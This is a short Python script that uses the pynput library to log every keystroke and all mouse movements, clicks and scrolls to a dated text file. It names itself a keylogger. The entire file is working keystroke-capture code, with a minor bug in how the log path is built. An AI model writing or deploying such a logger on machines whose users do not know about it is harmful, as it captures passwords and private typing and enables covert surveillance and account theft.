from pynput import keyboard
from pynput import mouse
import logging
import datetime

currentDT = datetime.datetime.now()
FORMAT = '%(asctime)s, %(message)s'
log_dir = r"home/vinh/Desktop"
keylogger_date = str(currentDT.year) + "-" + str(currentDT.month) + "-" + str(currentDT.day)
logging.basicConfig(filename = (log_dir + keylogger_date+"_keyLog.txt"), level=logging.DEBUG, format=FORMAT)

def on_press(key):
    try:
        logging.info('keyboard,press,{0}'.format(key.char))
        
    except AttributeError:
        logging.info('keyboard,press,{0}'.format(key))
    
def on_move(x, y):
    logging.info('mouse,move,{0}'.format((x, y)))

def on_click(x, y, button, pressed):
    logging.info('mouse,{0},{1}'.format(
        'Pressed' if pressed else 'Released',
        (x, y)))
    # if not pressed:
    #     # Stop listener
    #     return False

def on_scroll(x, y, dx, dy):
    logging.info('Scrolled {0} at {1}'.format(
        'down' if dy < 0 else 'up',
        (x, y)))

with mouse.Listener(on_move=on_move,on_click=on_click,on_scroll=on_scroll) as listener:
	with keyboard.Listener(on_press=on_press) as listener:
		listener.join()